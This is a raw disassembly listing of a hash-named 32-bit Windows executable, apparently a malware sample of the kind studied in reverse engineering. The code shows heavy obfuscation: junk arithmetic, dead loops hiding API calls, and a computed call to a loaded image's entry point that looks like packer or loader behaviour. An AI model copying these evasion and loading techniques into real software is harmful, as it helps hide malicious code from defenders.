
d46084a4a37ff1f19091d0e446bf3bd0247b2d6492b317a1271d2602be990642.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x14c
  401009:	push   ebx
  40100a:	add    DWORD PTR ds:0x413d18,edx
  401010:	push   esi
  401011:	adc    eax,DWORD PTR ds:0x41400c
  401017:	push   edi
  401018:	adc    DWORD PTR ds:0x413c74,ecx
  40101e:	xor    esi,esi
  401020:	sbb    eax,DWORD PTR ds:0x413bfe
  401026:	mov    DWORD PTR [ebp-0x10],esi
  401029:	adc    edi,eax
  40102b:	mov    eax,DWORD PTR [ebp-0x20]
  40102e:	and    DWORD PTR ds:0x413c06,0x0
  401038:	jmp    0x40104a
  40103d:	mov    edi,DWORD PTR ds:0x413c06
  401043:	inc    edi
  401044:	mov    DWORD PTR ds:0x413c06,edi
  40104a:	cmp    DWORD PTR ds:0x413c06,0x12
  401051:	jae    0x40107f
  401057:	cmp    DWORD PTR ds:0x413c06,0x18
  40105e:	jne    0x401074
  401064:	push   0x413c74
  401069:	push   0x1062
  40106e:	call   DWORD PTR ds:0x41675c
  401074:	jmp    0x40103d
  401079:	xor    DWORD PTR ds:0x413bf6,ebx
  40107f:	push   0x5
  401081:	mov    DWORD PTR [ebp-0x20],eax
  401084:	pop    edi
  401085:	push   0x4164c8
  40108a:	call   DWORD PTR ds:0x416794
  401090:	push   esi
  401091:	and    DWORD PTR ds:0x413c70,0x414018
  40109b:	push   0x69
  40109d:	push   0xe
  40109f:	push   0x6
  4010a1:	push   0x4
  4010a3:	xor    DWORD PTR ds:0x41401c,0x413c16
  4010ad:	push   0x87698897
  4010b2:	sbb    DWORD PTR ds:0x41401c,0x413c16
  4010bc:	call   DWORD PTR ds:0x416750
  4010c2:	push   esi
  4010c3:	add    DWORD PTR ds:0x413d2c,0x792b
  4010cd:	push   0x3
  4010cf:	push   0x2
  4010d1:	push   0x4
  4010d3:	sbb    DWORD PTR ds:0x414008,0x413c0e
  4010dd:	push   0x2
  4010df:	push   0x56778769
  4010e4:	push   0x76867576
  4010e9:	inc    DWORD PTR ds:0x413c74
  4010ef:	call   DWORD PTR ds:0x41674c
  4010f5:	add    DWORD PTR ds:0x413c6c,0x413d20
  4010ff:	dec    edi
  401100:	mov    DWORD PTR ds:0x413bf6,0x25f1
  40110a:	jne    0x401085
  401110:	push   0x4164f0
  401115:	sbb    DWORD PTR ds:0x414000,0x413c0e
  40111f:	push   esi
  401120:	push   esi
  401121:	and    DWORD PTR ds:0x413c78,0x5ead
  40112b:	call   DWORD PTR ds:0x416788
  401131:	test   eax,eax
  401133:	je     0x40114f
  401139:	mov    eax,ds:0x75687681
  40113e:	adc    ebx,DWORD PTR ds:0x413c0a
  401144:	imul   eax,eax,0x5463da1d
  40114a:	mov    ds:0x75687681,eax
  40114f:	mov    eax,DWORD PTR [ebp-0x20]
  401152:	mov    DWORD PTR ds:0x41401c,0x2026
  40115c:	mov    ebx,0xf89c85b0
  401161:	mov    DWORD PTR ds:0x413c78,0x6385
  40116b:	cmp    eax,ebx
  40116d:	jne    0x4011cf
  401173:	add    DWORD PTR ds:0x414004,0x37c8
  40117d:	mov    DWORD PTR ds:0x4164c4,0xf89c85b1
  401187:	push   DWORD PTR [ebp+0x10]
  40118a:	sub    DWORD PTR ds:0x413bfe,0x414004
  401194:	push   DWORD PTR [ebp+0xc]
  401197:	and    DWORD PTR ds:0x413c1a,0x413ce4
  4011a1:	push   DWORD PTR [ebp+0x8]
  4011a4:	xor    DWORD PTR ds:0x413d34,0x413d2c
  4011ae:	call   0x402685
  4011b3:	mov    ecx,DWORD PTR ds:0x4163b4
  4011b9:	mov    esi,DWORD PTR ds:0x413c1e
  4011bf:	or     DWORD PTR ds:0x413c06,esi
  4011c5:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4011cb:	xor    esi,esi
  4011cd:	mov    DWORD PTR [ecx],eax
  4011cf:	mov    DWORD PTR [ebp-0x8],ebx
  4011d2:	sub    ecx,DWORD PTR ds:0x413d20
  4011d8:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  4011df:	lea    eax,[ebp-0x60]
  4011e2:	xor    esi,DWORD PTR ds:0x413d18
  4011e8:	mov    DWORD PTR [ebp-0x48],eax
  4011eb:	lea    eax,[ebp-0x54]
  4011ee:	mov    DWORD PTR [ebp-0x1c],eax
  4011f1:	add    DWORD PTR ds:0x413c16,0x903
  4011fb:	mov    eax,ds:0x4163b4
  401200:	mov    eax,DWORD PTR [eax+0x1c8]
  401206:	adc    DWORD PTR ds:0x413cf4,edi
  40120c:	mov    eax,DWORD PTR [eax]
  40120e:	mov    esi,DWORD PTR ds:0x413ce4
  401214:	add    esi,DWORD PTR ds:0x413c16
  40121a:	mov    DWORD PTR ds:0x413ce4,esi
  401220:	mov    ecx,DWORD PTR [ebp-0x1c]
  401223:	xor    edi,edi
  401225:	mov    esi,0x7510894
  40122a:	xor    eax,esi
  40122c:	mov    edi,0x3272dc
  401231:	adc    DWORD PTR ds:0x413c78,0x59b2
  40123b:	add    eax,edi
  40123d:	mov    DWORD PTR ds:0x413d24,0x7b51
  401247:	mov    DWORD PTR [ecx],eax
  401249:	mov    eax,ds:0x4165e0
  40124e:	mov    DWORD PTR ds:0x413c80,0x7e03
  401258:	cmp    eax,0x312bc9f6
  40125d:	mov    DWORD PTR ds:0x413d24,0x296e
  401267:	jne    0x401312
  40126d:	mov    eax,DWORD PTR [ebp-0x8]
  401270:	mov    ecx,DWORD PTR ds:0x4163b4
  401276:	mov    ecx,DWORD PTR [ecx+0x198]
  40127c:	xor    eax,esi
  40127e:	add    eax,edi
  401280:	mov    edx,DWORD PTR ds:0x413c6c
  401286:	xor    DWORD PTR ds:0x414010,edx
  40128c:	mov    DWORD PTR [ecx],eax
  40128e:	movzx  ecx,BYTE PTR ds:0x413c6c
  401295:	and    ecx,DWORD PTR ds:0x413d2c
  40129b:	mov    DWORD PTR ds:0x413c6c,ecx
  4012a1:	mov    eax,DWORD PTR [ebp-0x8]
  4012a4:	mov    DWORD PTR ds:0x413cd8,0x1b
  4012ae:	cmp    DWORD PTR ds:0x413cd8,0x0
  4012b5:	je     0x401303
  4012bb:	cmp    DWORD PTR ds:0x413cd8,0x1c
  4012c2:	jne    0x4012dd
  4012c8:	push   0x104b
  4012cd:	push   0x413d18
  4012d2:	push   0x2575
  4012d7:	call   DWORD PTR ds:0x416760
  4012dd:	xor    edx,edx
  4012df:	xor    edx,DWORD PTR ds:0x413cd8
  4012e5:	dec    edx
  4012e6:	mov    DWORD PTR ds:0x413cd8,edx
  4012ec:	jmp    0x4012ae
  4012f1:	mov    edx,DWORD PTR ds:0x413ce8
  4012f7:	or     edx,DWORD PTR ds:0x413c7c
  4012fd:	mov    DWORD PTR ds:0x413ce8,edx
  401303:	xor    eax,esi
  401305:	add    eax,edi
  401307:	or     ecx,DWORD PTR ds:0x413d24
  40130d:	mov    ds:0x4165e0,eax
  401312:	mov    eax,ds:0x4163b4
  401317:	mov    eax,DWORD PTR [eax+0x18c]
  40131d:	and    DWORD PTR ds:0x413c1a,0x0
  401327:	jmp    0x401339
  40132c:	mov    ecx,DWORD PTR ds:0x413c1a
  401332:	inc    ecx
  401333:	mov    DWORD PTR ds:0x413c1a,ecx
  401339:	cmp    DWORD PTR ds:0x413c1a,0x15
  401340:	jae    0x40136e
  401346:	cmp    DWORD PTR ds:0x413c1a,0x20
  40134d:	jne    0x401369
  401353:	push   0x6f97
  401358:	push   DWORD PTR [ebp-0x18]
  40135b:	push   0x2919
  401360:	push   DWORD PTR [ebp-0x14]
  401363:	call   DWORD PTR ds:0x416764
  401369:	jmp    0x40132c
  40136e:	mov    eax,DWORD PTR [eax]
  401370:	xor    edx,edx
  401372:	or     edx,DWORD PTR ds:0x413c0e
  401378:	adc    DWORD PTR ds:0x413cdc,edx
  40137e:	mov    DWORD PTR [ebp-0xa4],eax
  401384:	xor    eax,eax
  401386:	xor    eax,DWORD PTR ds:0x413cd0
  40138c:	mov    eax,DWORD PTR [eax]
  40138e:	sbb    DWORD PTR ds:0x413d34,eax
  401394:	mov    eax,0xf89c85bc
  401399:	xor    edx,ecx
  40139b:	mov    DWORD PTR [ebp-0x10],eax
  40139e:	mov    DWORD PTR [ebp-0x10],eax
  4013a1:	mov    DWORD PTR [ebp-0x10],eax
  4013a4:	sub    ecx,ecx
  4013a6:	mov    DWORD PTR [ebp-0x1c],ebx
  4013a9:	or     DWORD PTR ds:0x413c80,0x7e3b
  4013b3:	mov    DWORD PTR [ebp-0x10],eax
  4013b6:	mov    DWORD PTR [ebp-0x10],0xf89c85b8
  4013bd:	add    DWORD PTR ds:0x413d34,edi
  4013c3:	mov    ecx,DWORD PTR [ebp-0x8]
  4013c6:	xor    ecx,esi
  4013c8:	add    ecx,edi
  4013ca:	mov    DWORD PTR [ebp-0x18],ecx
  4013cd:	add    DWORD PTR ds:0x414018,edi
  4013d3:	mov    ecx,DWORD PTR [ebp-0xc]
  4013d6:	and    DWORD PTR ds:0x413c7c,0xe1
  4013e0:	mov    edx,DWORD PTR [ebp-0xc]
  4013e3:	adc    DWORD PTR ds:0x413d28,0x413d20
  4013ed:	xor    edx,esi
  4013ef:	xor    ecx,esi
  4013f1:	sbb    DWORD PTR ds:0x414014,0x47d8
  4013fb:	add    ecx,edx
  4013fd:	movzx  edx,BYTE PTR ds:0x41400c
  401404:	and    DWORD PTR ds:0x413bf6,edx
  40140a:	mov    edx,DWORD PTR [ebp-0xc]
  40140d:	xor    edx,esi
  40140f:	lea    ecx,[ecx+edx*1+0x975894]
  401416:	cmp    DWORD PTR [ebp-0x18],ecx
  401419:	ja     0x4015f5
  40141f:	or     eax,DWORD PTR ds:0x413bfa
  401425:	mov    eax,DWORD PTR [ebp-0xc]
  401428:	mov    ecx,DWORD PTR ds:0x413c80
  40142e:	xor    DWORD PTR ds:0x413ce8,ecx
  401434:	mov    ecx,DWORD PTR [ebp-0x18]
  401437:	sbb    DWORD PTR ds:0x413d20,0x413d34
  401441:	xor    eax,esi
  401443:	and    DWORD PTR ds:0x413cdc,0x413d24
  40144d:	lea    eax,[eax+ecx*1+0x3272dc]
  401454:	sub    DWORD PTR ds:0x414008,0x413cd8
  40145e:	push   eax
  40145f:	sbb    DWORD PTR ds:0x413c0a,edi
  401465:	mov    eax,DWORD PTR [ebp-0x1c]
  401468:	xor    DWORD PTR ds:0x413c80,0x7b1e
  401472:	xor    eax,esi
  401474:	lea    eax,[ebp+eax*1+0x3272e4]
  40147b:	or     DWORD PTR ds:0x413c16,0x7d42
  401485:	push   eax
  401486:	mov    DWORD PTR ds:0x414018,0x19
  401490:	cmp    DWORD PTR ds:0x414018,0x0
  401497:	je     0x4014cb
  40149d:	cmp    DWORD PTR ds:0x414018,0x28
  4014a4:	jne    0x4014bb
  4014aa:	push   DWORD PTR [ebp-0x14]
  4014ad:	push   DWORD PTR [ebp-0x18]
  4014b0:	push   0x400000
  4014b5:	call   DWORD PTR ds:0x416768
  4014bb:	mov    eax,ds:0x414018
  4014c0:	dec    eax
  4014c1:	mov    ds:0x414018,eax
  4014c6:	jmp    0x401490
  4014cb:	mov    eax,ds:0x4163b4
  4014d0:	and    DWORD PTR ds:0x413c6c,0x2ac9
  4014da:	push   DWORD PTR [eax+0x1bc]
  4014e0:	call   0x40a25b
  4014e5:	mov    eax,DWORD PTR [ebp-0xc]
  4014e8:	sbb    edx,edx
  4014ea:	mov    ecx,DWORD PTR [ebp-0x18]
  4014ed:	and    DWORD PTR ds:0x413d24,0x0
  4014f7:	mov    edx,DWORD PTR ds:0x413d24
  4014fd:	inc    edx
  4014fe:	mov    DWORD PTR ds:0x413d24,edx
  401504:	cmp    DWORD PTR ds:0x413d24,0x1c
  40150b:	jne    0x401525
  401511:	push   DWORD PTR [ebp-0x14]
  401514:	push   0x413d30
  401519:	push   DWORD PTR [ebp-0x1c]
  40151c:	push   DWORD PTR [ebp-0x24]
  40151f:	call   DWORD PTR ds:0x416770
  401525:	cmp    DWORD PTR ds:0x413d24,0x1b
  40152c:	jb     0x4014f7
  401532:	xor    eax,esi
  401534:	lea    eax,[ecx+eax*1+0x3272dc]
  40153b:	mov    ecx,DWORD PTR [ebp-0xc]
  40153e:	mov    edx,DWORD PTR [ebp-0xc]
  401541:	dec    DWORD PTR ds:0x413bf6
  401547:	xor    edx,esi
  401549:	xor    ecx,esi
  40154b:	sbb    DWORD PTR ds:0x413c1e,0x34e4
  401555:	add    ecx,edx
  401557:	and    DWORD PTR ds:0x413c02,0x0
  401561:	jmp    0x401573
  401566:	mov    edx,DWORD PTR ds:0x413c02
  40156c:	inc    edx
  40156d:	mov    DWORD PTR ds:0x413c02,edx
  401573:	cmp    DWORD PTR ds:0x413c02,0x1b
  40157a:	jae    0x4015bf
  401580:	cmp    DWORD PTR ds:0x413c02,0x1e
  401587:	jne    0x4015a7
  40158d:	push   0x413d28
  401592:	push   0x3ad3
  401597:	push   0x416152
  40159c:	push   0x416152
  4015a1:	call   DWORD PTR ds:0x416774
  4015a7:	jmp    0x401566
  4015ac:	movzx  edx,BYTE PTR ds:0x413ce8
  4015b3:	sub    edx,DWORD PTR ds:0x413c1a
  4015b9:	mov    DWORD PTR ds:0x413ce8,edx
  4015bf:	mov    edx,DWORD PTR [ebp-0xc]
  4015c2:	xor    DWORD PTR ds:0x413c80,0x413c74
  4015cc:	xor    edx,esi
  4015ce:	lea    ecx,[ecx+edx*1+0x975894]
  4015d5:	mov    DWORD PTR [ebp-0x18],eax
  4015d8:	cmp    eax,ecx
  4015da:	mov    DWORD PTR ds:0x413c7c,0x908
  4015e4:	jbe    0x40141f
  4015ea:	add    DWORD PTR ds:0x413cf4,ecx
  4015f0:	mov    eax,0xf89c85bc
  4015f5:	add    DWORD PTR ds:0x414014,ecx
  4015fb:	mov    ecx,DWORD PTR [ebp+0xc]
  4015fe:	mov    DWORD PTR ds:0x416238,ecx
  401604:	mov    ecx,DWORD PTR [ebp+0x10]
  401607:	and    DWORD PTR ds:0x413c1a,0x0
  401611:	mov    edx,DWORD PTR ds:0x413c1a
  401617:	inc    edx
  401618:	mov    DWORD PTR ds:0x413c1a,edx
  40161e:	cmp    DWORD PTR ds:0x413c1a,0x25
  401625:	jne    0x40163e
  40162b:	push   DWORD PTR [ebp-0x1c]
  40162e:	push   0x414004
  401633:	push   0x416170
  401638:	call   DWORD PTR ds:0x416778
  40163e:	cmp    DWORD PTR ds:0x413c1a,0x19
  401645:	jb     0x401611
  40164b:	mov    DWORD PTR ds:0x41648c,ecx
  401651:	adc    DWORD PTR ds:0x413c1e,ebx
  401657:	mov    ecx,DWORD PTR ds:0x416238
  40165d:	mov    edx,DWORD PTR ds:0x414014
  401663:	xor    DWORD PTR ds:0x413c0e,edx
  401669:	mov    edx,DWORD PTR [ebp-0x48]
  40166c:	sub    ecx,edi
  40166e:	and    DWORD PTR ds:0x413cf0,0x24ff
  401678:	xor    ecx,esi
  40167a:	mov    DWORD PTR [edx],ecx
  40167c:	not    ecx
  40167e:	mov    ecx,DWORD PTR [ebp-0x20]
  401681:	mov    DWORD PTR ds:0x413c16,0x6aa9
  40168b:	cmp    ecx,ebx
  40168d:	mov    DWORD PTR ds:0x413c70,0x4e28
  401697:	jne    0x401b90
  40169d:	add    DWORD PTR ds:0x413d18,0x41400c
  4016a7:	lea    eax,[ebp-0x5c]
  4016aa:	and    DWORD PTR ds:0x413c16,0x3f2d
  4016b4:	mov    DWORD PTR [ebp-0xb0],eax
  4016ba:	lea    eax,[ebp+0x4]
  4016bd:	add    DWORD PTR ds:0x413cec,0x413d24
  4016c7:	mov    DWORD PTR [ebp-0x5c],eax
  4016ca:	mov    eax,DWORD PTR [ebp-0x5c]
  4016cd:	xor    DWORD PTR ds:0x413ce4,0x37e4
  4016d7:	test   eax,eax
  4016d9:	mov    DWORD PTR ds:0x413c7c,0x3884
  4016e3:	je     0x402663
  4016e9:	adc    DWORD PTR ds:0x413c12,ebx
  4016ef:	mov    eax,DWORD PTR [ebp-0x24]
  4016f2:	mov    eax,DWORD PTR [ebp-0xc]
  4016f5:	mov    eax,DWORD PTR [ebp-0x8]
  4016f8:	sub    ecx,0x1090
  4016fe:	mov    DWORD PTR [ebp+0xc],eax
  401701:	mov    eax,eax
  401703:	mov    eax,ds:0x4163b4
  401708:	and    DWORD PTR ds:0x413bfa,0x0
  401712:	jmp    0x401724
  401717:	mov    ecx,DWORD PTR ds:0x413bfa
  40171d:	inc    ecx
  40171e:	mov    DWORD PTR ds:0x413bfa,ecx
  401724:	cmp    DWORD PTR ds:0x413bfa,0x11
  40172b:	jae    0x401754
  401731:	cmp    DWORD PTR ds:0x413bfa,0x20
  401738:	jne    0x401749
  40173e:	push   0x4160de
  401743:	call   DWORD PTR ds:0x41677c
  401749:	jmp    0x401717
  40174e:	and    DWORD PTR ds:0x413c74,ecx
  401754:	mov    eax,DWORD PTR [eax+0x1c8]
  40175a:	and    DWORD PTR ds:0x414010,0x0
  401764:	mov    ecx,DWORD PTR ds:0x414010
  40176a:	inc    ecx
  40176b:	mov    DWORD PTR ds:0x414010,ecx
  401771:	cmp    DWORD PTR ds:0x414010,0xf
  401778:	jne    0x401791
  40177e:	push   0x413c0a
  401783:	push   DWORD PTR [ebp-0x20]
  401786:	push   0x4160b3
  40178b:	call   DWORD PTR ds:0x416780
  401791:	cmp    DWORD PTR ds:0x414010,0xe
  401798:	jne    0x4017ab
  40179e:	mov    ecx,DWORD PTR ds:0x414010
  4017a4:	inc    ecx
  4017a5:	mov    DWORD PTR ds:0x414010,ecx
  4017ab:	cmp    DWORD PTR ds:0x414010,0x1c
  4017b2:	jb     0x401764
  4017b8:	mov    DWORD PTR ds:0x413bf6,0x13
  4017c2:	cmp    DWORD PTR ds:0x413bf6,0x0
  4017c9:	je     0x401820
  4017cf:	cmp    DWORD PTR ds:0x413bf6,0x6
  4017d6:	jne    0x4017ec
  4017dc:	push   0x414018
  4017e1:	push   0x1023
  4017e6:	call   DWORD PTR ds:0x416784
  4017ec:	cmp    DWORD PTR ds:0x413bf6,0x7
  4017f3:	jne    0x401808
  4017f9:	xor    ecx,ecx
  4017fb:	add    ecx,DWORD PTR ds:0x413bf6
  401801:	dec    ecx
  401802:	mov    DWORD PTR ds:0x413bf6,ecx
  401808:	mov    ecx,DWORD PTR ds:0x413bf6
  40180e:	dec    ecx
  40180f:	mov    DWORD PTR ds:0x413bf6,ecx
  401815:	jmp    0x4017c2
  40181a:	adc    DWORD PTR ds:0x413ce8,ebx
  401820:	mov    eax,DWORD PTR [eax]
  401822:	and    DWORD PTR ds:0x414010,0x0
  40182c:	jmp    0x401840
  401831:	xor    ecx,ecx
  401833:	add    ecx,DWORD PTR ds:0x414010
  401839:	inc    ecx
  40183a:	mov    DWORD PTR ds:0x414010,ecx
  401840:	cmp    DWORD PTR ds:0x414010,0x19
  401847:	jae    0x401873
  40184d:	cmp    DWORD PTR ds:0x414010,0x27
  401854:	jne    0x401868
  40185a:	push   DWORD PTR [ebp-0x18]
  40185d:	push   0x4160de
  401862:	call   DWORD PTR ds:0x41678c
  401868:	jmp    0x401831
  40186d:	sub    DWORD PTR ds:0x413c0a,edi
  401873:	cdq    
  401874:	mov    ebx,eax
  401876:	mov    eax,0xfabdbeef
  40187b:	mov    ecx,DWORD PTR ds:0x413c1e
  401881:	or     DWORD PTR ds:0x413d1c,ecx
  401887:	add    ebx,eax
  401889:	mov    ecx,0x6f0c
  40188e:	adc    edx,0xffffffff
  401891:	and    DWORD PTR [ebp-0x10],0x0
  401895:	sub    DWORD PTR ds:0x413c6c,0x6250
  40189f:	xor    edx,0x0
  4018a2:	xor    DWORD PTR ds:0x413c84,ecx
  4018a8:	mov    DWORD PTR [ebp-0x80],edx
  4018ab:	mov    edx,DWORD PTR [ebp+0xc]
  4018ae:	mov    DWORD PTR ds:0x413c74,0x12
  4018b8:	cmp    DWORD PTR ds:0x413c74,0x0
  4018bf:	je     0x401906
  4018c5:	cmp    DWORD PTR ds:0x413c74,0x1e
  4018cc:	jne    0x4018f2
  4018d2:	push   DWORD PTR [ebp-0x24]
  4018d5:	push   0x413cd8
  4018da:	push   0x560c
  4018df:	push   0x416049
  4018e4:	push   DWORD PTR [ebp-0x18]
  4018e7:	push   0x1b95
  4018ec:	call   DWORD PTR ds:0x416790
  4018f2:	mov    ecx,DWORD PTR ds:0x413c74
  4018f8:	dec    ecx
  4018f9:	mov    DWORD PTR ds:0x413c74,ecx
  4018ff:	jmp    0x4018b8
  401904:	not    ecx
  401906:	mov    DWORD PTR [ebp-0x14],edx
  401909:	and    DWORD PTR ds:0x413c06,0x0
  401913:	jmp    0x401925
  401918:	mov    edx,DWORD PTR ds:0x413c06
  40191e:	inc    edx
  40191f:	mov    DWORD PTR ds:0x413c06,edx
  401925:	cmp    DWORD PTR ds:0x413c06,0x14
  40192c:	jae    0x401967
  401932:	cmp    DWORD PTR ds:0x413c06,0x5
  401939:	jne    0x401948
  40193f:	push   DWORD PTR [ebp-0xc]
  401942:	call   DWORD PTR ds:0x416798
  401948:	cmp    DWORD PTR ds:0x413c06,0x4
  40194f:	jne    0x401962
  401955:	mov    edx,DWORD PTR ds:0x413c06
  40195b:	inc    edx
  40195c:	mov    DWORD PTR ds:0x413c06,edx
  401962:	jmp    0x401918
  401967:	mov    ecx,0x8a29a125
  40196c:	xor    ebx,ecx
  40196e:	neg    DWORD PTR ds:0x413d18
  401974:	add    DWORD PTR [ebp-0x14],eax
  401977:	mov    DWORD PTR ds:0x414010,ebx
  40197d:	mov    edx,DWORD PTR [ebp-0x14]
  401980:	mov    DWORD PTR ds:0x41401c,0x7ba5
  40198a:	adc    DWORD PTR [ebp-0x10],0xffffffff
  40198e:	xor    edx,ecx
  401990:	add    DWORD PTR ds:0x414010,0x307
  40199a:	mov    DWORD PTR [ebp-0x78],edx
  40199d:	mov    edx,DWORD PTR [ebp-0x10]
  4019a0:	xor    edx,0x0
  4019a3:	mov    DWORD PTR ds:0x414018,0x4b60
  4019ad:	mov    DWORD PTR [ebp-0x74],edx
  4019b0:	cmp    DWORD PTR [ebp-0x78],ebx
  4019b3:	mov    DWORD PTR ds:0x413c02,0x936
  4019bd:	jne    0x4019df
  4019c3:	mov    DWORD PTR ds:0x413c0a,edx
  4019c9:	mov    edx,DWORD PTR [ebp-0x80]
  4019cc:	cmp    DWORD PTR [ebp-0x74],edx
  4019cf:	mov    DWORD PTR ds:0x413c7c,0x301a
  4019d9:	je     0x401aa0
  4019df:	and    DWORD PTR ds:0x413d34,0x0
  4019e9:	jmp    0x4019fb
  4019ee:	mov    edx,DWORD PTR ds:0x413d34
  4019f4:	inc    edx
  4019f5:	mov    DWORD PTR ds:0x413d34,edx
  4019fb:	cmp    DWORD PTR ds:0x413d34,0x16
  401a02:	jae    0x401a25
  401a08:	cmp    DWORD PTR ds:0x413d34,0x26
  401a0f:	jne    0x401a20
  401a15:	push   0x414014
  401a1a:	call   DWORD PTR ds:0x41679c
  401a20:	jmp    0x4019ee
  401a25:	mov    edx,DWORD PTR ds:0x4163b4
  401a2b:	neg    DWORD PTR ds:0x414008
  401a31:	mov    edx,DWORD PTR [edx+0x1c0]
  401a37:	mov    DWORD PTR ds:0x413bf6,0x5ff4
  401a41:	mov    edx,DWORD PTR [edx]
  401a43:	and    DWORD PTR ds:0x413ce0,0x41400c
  401a4d:	xor    ebx,ebx
  401a4f:	add    edx,eax
  401a51:	mov    DWORD PTR ds:0x413c78,0x3f53
  401a5b:	adc    ebx,0xffffffff
  401a5e:	and    DWORD PTR ds:0x413c02,0x1b79
  401a68:	xor    edx,ecx
  401a6a:	add    DWORD PTR ds:0x413ce0,0x413c6c
  401a74:	xor    ebx,0x0
  401a77:	mov    DWORD PTR ds:0x413bfa,0x4fab
  401a81:	cmp    edx,0x70941fd5
  401a87:	mov    DWORD PTR ds:0x413d2c,0x7f9c
  401a91:	jne    0x402663
  401a97:	cmp    ebx,0xffffffff
  401a9a:	jne    0x402663
  401aa0:	mov    edx,DWORD PTR ds:0x416430
  401aa6:	add    DWORD PTR ds:0x413cdc,0x3946
  401ab0:	mov    ebx,DWORD PTR ds:0x416438
  401ab6:	and    DWORD PTR ds:0x413c80,0x3ee6
  401ac0:	xor    edx,ebx
  401ac2:	mov    DWORD PTR ds:0x414000,0x16
  401acc:	cmp    DWORD PTR ds:0x414000,0x0
  401ad3:	je     0x401b12
  401ad9:	cmp    DWORD PTR ds:0x414000,0x26
  401ae0:	jne    0x401af6
  401ae6:	push   0x413c84
  401aeb:	push   0x56a1
  401af0:	call   DWORD PTR ds:0x41675c
  401af6:	mov    ebx,DWORD PTR ds:0x414000
  401afc:	dec    ebx
  401afd:	mov    DWORD PTR ds:0x414000,ebx
  401b03:	jmp    0x401acc
  401b08:	add    DWORD PTR ds:0x413c84,0x1062
  401b12:	mov    DWORD PTR ds:0x416430,edx
  401b18:	mov    ebx,DWORD PTR ds:0x416430
  401b1e:	and    DWORD PTR ds:0x413d20,0x0
  401b28:	jmp    0x401b3a
  401b2d:	mov    edx,DWORD PTR ds:0x413d20
  401b33:	inc    edx
  401b34:	mov    DWORD PTR ds:0x413d20,edx
  401b3a:	cmp    DWORD PTR ds:0x413d20,0x1a
  401b41:	jae    0x401b72
  401b47:	cmp    DWORD PTR ds:0x413d20,0x25
  401b4e:	jne    0x401b67
  401b54:	push   DWORD PTR [ebp-0x24]
  401b57:	push   0x413d1c
  401b5c:	push   0x7dc0
  401b61:	call   DWORD PTR ds:0x416760
  401b67:	jmp    0x401b2d
  401b6c:	adc    DWORD PTR ds:0x413bfe,edi
  401b72:	mov    edx,DWORD PTR [ebp-0x5c]
  401b75:	xor    DWORD PTR ds:0x413c7c,0x413c1e
  401b7f:	add    DWORD PTR [edx],ebx
  401b81:	mov    DWORD PTR ds:0x414010,0x3837
  401b8b:	jmp    0x402624
  401b90:	mov    DWORD PTR ds:0x41401c,0x671d
  401b9a:	mov    ecx,DWORD PTR [ebp-0x60]
  401b9d:	mov    DWORD PTR ds:0x413c02,0x3bc3
  401ba7:	cmp    ecx,0xf89c85b1
  401bad:	je     0x401d26
  401bb3:	mov    ecx,DWORD PTR [ebp-0x8]
  401bb6:	mov    edx,DWORD PTR [ebp-0x54]
  401bb9:	or     DWORD PTR ds:0x413c1a,0x413cdc
  401bc3:	xor    ecx,esi
  401bc5:	add    ecx,edi
  401bc7:	cmp    ecx,edx
  401bc9:	je     0x401d26
  401bcf:	mov    DWORD PTR ds:0x413d28,0x18
  401bd9:	cmp    DWORD PTR ds:0x413d28,0x0
  401be0:	je     0x401c32
  401be6:	cmp    DWORD PTR ds:0x413d28,0xa
  401bed:	jne    0x401c07
  401bf3:	push   0x7420
  401bf8:	push   DWORD PTR [ebp-0xc]
  401bfb:	push   DWORD PTR [ebp-0x20]
  401bfe:	push   DWORD PTR [ebp-0x14]
  401c01:	call   DWORD PTR ds:0x416764
  401c07:	cmp    DWORD PTR ds:0x413d28,0xb
  401c0e:	jne    0x401c1f
  401c14:	mov    eax,ds:0x413d28
  401c19:	dec    eax
  401c1a:	mov    ds:0x413d28,eax
  401c1f:	xor    eax,eax
  401c21:	add    eax,DWORD PTR ds:0x413d28
  401c27:	dec    eax
  401c28:	mov    ds:0x413d28,eax
  401c2d:	jmp    0x401bd9
  401c32:	mov    eax,ds:0x4163b4
  401c37:	mov    DWORD PTR ds:0x413c88,0x7ef
  401c41:	mov    eax,DWORD PTR [eax+0x194]
  401c47:	mov    ecx,DWORD PTR [eax]
  401c49:	mov    eax,DWORD PTR [ecx+0x3c]
  401c4c:	adc    DWORD PTR ds:0x413c74,0x414014
  401c56:	push   DWORD PTR ds:0x41648c
  401c5c:	add    DWORD PTR ds:0x413c1e,0x413d24
  401c66:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  401c6a:	push   DWORD PTR ds:0x416238
  401c70:	add    DWORD PTR ds:0x414000,0x414014
  401c7a:	add    eax,ecx
  401c7c:	mov    DWORD PTR ds:0x413d1c,0x15
  401c86:	cmp    DWORD PTR ds:0x413d1c,0x0
  401c8d:	je     0x401ce5
  401c93:	cmp    DWORD PTR ds:0x413d1c,0x3
  401c9a:	jne    0x401cb1
  401ca0:	push   0x8408
  401ca5:	push   DWORD PTR [ebp-0x24]
  401ca8:	push   DWORD PTR [ebp-0x1c]
  401cab:	call   DWORD PTR ds:0x416768
  401cb1:	cmp    DWORD PTR ds:0x413d1c,0x4
  401cb8:	jne    0x401ccb
  401cbe:	mov    ecx,DWORD PTR ds:0x413d1c
  401cc4:	dec    ecx
  401cc5:	mov    DWORD PTR ds:0x413d1c,ecx
  401ccb:	xor    ecx,ecx
  401ccd:	or     ecx,DWORD PTR ds:0x413d1c
  401cd3:	dec    ecx
  401cd4:	mov    DWORD PTR ds:0x413d1c,ecx
  401cda:	jmp    0x401c86
  401cdf:	add    DWORD PTR ds:0x413bfa,ecx
  401ce5:	mov    ecx,DWORD PTR ds:0x4163b4
  401ceb:	mov    ecx,DWORD PTR [ecx+0x194]
  401cf1:	or     DWORD PTR ds:0x414000,0x5329
  401cfb:	push   DWORD PTR [ecx]
  401cfd:	call   eax
  401cff:	mov    ecx,DWORD PTR ds:0x4163b4
  401d05:	mov    ecx,DWORD PTR [ecx+0x1cc]
  401d0b:	mov    DWORD PTR ds:0x413c78,0x5666
  401d15:	mov    DWORD PTR [ecx],eax
  401d17:	mov    DWORD PTR ds:0x413d24,0x5c21
  401d21:	jmp    0x402663
  401d26:	adc    edx,DWORD PTR ds:0x413cf0
  401d2c:	mov    ecx,DWORD PTR [ebp-0x8]
  401d2f:	sub    edx,DWORD PTR ds:0x413c70
  401d35:	mov    edx,DWORD PTR [ebp-0xa4]
